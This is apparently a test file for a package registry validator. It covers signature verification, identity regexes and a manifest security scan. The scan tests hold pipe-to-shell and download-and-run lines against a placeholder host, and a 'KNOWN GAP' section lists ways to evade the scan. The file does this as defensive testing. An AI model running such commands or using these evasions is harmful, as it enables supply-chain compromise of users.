#!/usr/bin/env node
// validate.test.mjs — self-tests for the registry validator's security-critical
// pure helpers. Zero dependencies: uses the built-in node:test runner + node:assert.
//
//   node --test scripts/validate.test.mjs
//
// These lock in the behaviour of the manifest security scan, ed25519 signature
// verification, key-id derivation, and the publisher/slug identity rules — and,
// importantly, DOCUMENT the known scan-evasion gaps so a future change that
// narrows them turns the "KNOWN GAP" assertions red (a deliberate tripwire).

import test from "node:test";
import assert from "node:assert/strict";
import { generateKeyPairSync, sign as edSign, createHash } from "node:crypto";

import {
  keyID,
  signedPayload,
  verifySignature,
  scanManifest,
  VALID_PUBLISHER,
  VALID_SLUG,
  CHANNELS,
} from "./validate.mjs";

// --- helpers ----------------------------------------------------------------

function newKey() {
  const { publicKey, privateKey } = generateKeyPairSync("ed25519");
  const pubRaw = Buffer.from(publicKey.export({ format: "jwk" }).x, "base64url");
  return { privateKey, pubB64: pubRaw.toString("base64") };
}
const highFields = (m) => scanManifest(m).filter((f) => f.severity === "high").map((f) => f.field);
const hasHigh = (m) => scanManifest(m).some((f) => f.severity === "high");

// --- key id -----------------------------------------------------------------

test("keyID = sha256(rawpub)[:16] and matches a 32-byte key", () => {
  const { pubB64 } = newKey();
  const raw = Buffer.from(pubB64, "base64");
  const expected = createHash("sha256").update(raw).digest("hex").slice(0, 16);
  assert.equal(keyID(pubB64), expected);
  assert.equal(keyID(pubB64).length, 16);
});

test("keyID rejects a non-32-byte key", () => {
  assert.equal(keyID(Buffer.alloc(31).toString("base64")), "");
  assert.equal(keyID(Buffer.alloc(33).toString("base64")), "");
  assert.equal(keyID(""), "");
});

// --- signature verification -------------------------------------------------

test("verifySignature accepts a valid ed25519 release-identity signature", () => {
  const { privateKey, pubB64 } = newKey();
  const payload = signedPayload("hello-tool", "1.0.0", "https://x/y.tar.gz");
  const sig = edSign(null, payload, privateKey).toString("base64");
  assert.equal(verifySignature(payload, sig, pubB64), true);
});

test("verifySignature rejects a signature over a tampered artifact_url", () => {
  const { privateKey, pubB64 } = newKey();
  const signed = signedPayload("hello-tool", "1.0.0", "https://good/y.tar.gz");
  const sig = edSign(null, signed, privateKey).toString("base64");
  const tampered = signedPayload("hello-tool", "1.0.0", "https://evil/y.tar.gz");
  assert.equal(verifySignature(tampered, sig, pubB64), false);
});

test("verifySignature rejects a signature from a different key (no forgery)", () => {
  const a = newKey();
  const b = newKey();
  const payload = signedPayload("hello-tool", "1.0.0", "https://x/y.tar.gz");
  const sig = edSign(null, payload, a.privateKey).toString("base64");
  assert.equal(verifySignature(payload, sig, b.pubB64), false);
});

test("verifySignature rejects malformed signature / key", () => {
  const { pubB64 } = newKey();
  const payload = signedPayload("s", "1", "u");
  assert.equal(verifySignature(payload, "not-a-sig", pubB64), false);
  assert.equal(verifySignature(payload, Buffer.alloc(64).toString("base64"), "short"), false);
});

test("signedPayload is exactly slug\\0version\\0artifact_url", () => {
  assert.deepEqual(signedPayload("a", "b", "c"), Buffer.from("a\x00b\x00c", "utf8"));
});

// --- identity rules ---------------------------------------------------------

test("VALID_PUBLISHER mirrors core publisherRE", () => {
  for (const ok of ["acme", "a1", "my-co", "a".repeat(39)]) assert.ok(VALID_PUBLISHER.test(ok), ok);
  for (const bad of ["", "A", "-x", "x".repeat(40), "x_y", "foo.bar", "-"]) assert.ok(!VALID_PUBLISHER.test(bad), bad);
});

test("VALID_SLUG mirrors core slugRE (allows a 1-char slug)", () => {
  for (const ok of ["x", "hello-tool", "a1", "a".repeat(39)]) assert.ok(VALID_SLUG.test(ok), ok);
  for (const bad of ["", "Hello", "foo.bar", "foo_bar", "-x", "x".repeat(40), ".."]) assert.ok(!VALID_SLUG.test(bad), bad);
});

test("CHANNELS = {stable, beta}", () => {
  assert.ok(CHANNELS.has("stable") && CHANNELS.has("beta"));
  assert.ok(!CHANNELS.has("dev") && !CHANNELS.has(""));
});

// --- security scan: it MUST flag the obvious supply-chain footguns ----------

test("scan flags curl|sh pipe-to-shell installers (high)", () => {
  for (const step of ["curl http://e/x.sh | sh", "wget -qO- http://e/x|bash", "curl http://e/x | bash"]) {
    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
  }
});

test("scan flags wildcard (*) egress (high)", () => {
  assert.deepEqual(highFields({ openapi: { allowed_hosts: ["*"] } }), ["openapi.allowed_hosts"]);
});

test("scan flags unmarked credential-looking config fields (high)", () => {
  for (const key of ["api_token", "client_secret", "user_password", "MY_APIKEY", "private_key"]) {
    assert.ok(hasHigh({ config: [{ key }] }), key);
  }
});

test("scan passes a clean, least-privilege manifest", () => {
  assert.equal(hasHigh({
    openapi: { allowed_hosts: ["api.acme.example.com"] },
    config: [{ key: "api_token", secret: true }],
    host_native: {},
  }), false);
});

test("scan: exec_start network fetch is a warn, not a hard fail", () => {
  const findings = scanManifest({ host_native: { exec_start: "curl http://e/x -o b && ./b" } });
  assert.ok(findings.some((f) => f.severity === "warn" && f.field === "host_native.exec_start"));
  assert.equal(findings.some((f) => f.severity === "high"), false);
});

// --- KNOWN GAPS (tripwires) -------------------------------------------------
// These assert the scan's CURRENT (limited) reach. They are NOT endorsements —
// each is a documented evasion the human moderation layer must still catch. If a
// future change tightens the scan, flip the corresponding assertion. See the
// audit notes / MODERATION.md (the scan is advisory; signature + human review are
// the hard controls).

test("KNOWN GAP: only literal '*' egress is caught, not wildcard prefixes", () => {
  assert.equal(hasHigh({ openapi: { allowed_hosts: ["*.evil.example"] } }), false);
});

test("KNOWN GAP: pipe-to-shell only matches curl/wget + a few literal pipe forms", () => {
  // non-curl/wget downloader, or odd whitespace, slips past the substring scan
  assert.equal(hasHigh({ host_native: { install: ["aria2c http://e/x.sh -o /t/x && sh /t/x"] } }), false);
  assert.equal(hasHigh({ host_native: { install: ["curl http://e/x.sh |  sh"] } }), false); // double space
  assert.equal(hasHigh({ host_native: { install: ["curl http://e/x | python"] } }), false); // pipe to interpreter
});

test("KNOWN GAP: credential hint list is fixed; e.g. 'credential'/'pat' are not flagged", () => {
  assert.equal(hasHigh({ config: [{ key: "auth_credential" }] }), false);
  assert.equal(hasHigh({ config: [{ key: "pat" }] }), false);
});
